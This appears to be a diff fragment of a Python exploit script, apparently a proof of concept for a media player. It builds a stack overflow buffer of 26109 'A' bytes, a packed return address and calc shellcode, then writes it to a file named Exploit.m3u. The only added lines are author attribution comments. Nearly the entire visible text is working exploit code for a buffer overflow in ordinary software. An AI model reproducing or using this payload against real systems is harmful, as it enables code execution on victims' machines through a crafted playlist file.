@@ -19,3 +19,5 @@ Shellcode = b"\x41"*26109 + pack("<I",0x01AF3F0F) + PRE_ESP +  Calc
 File = open("Exploit.m3u","wb") 
 File.write(Shellcode)
 File.close()
+# Eren Şimşek <Aporlorxl23>
+# https://www.linkedin.com/in/erensimsek/
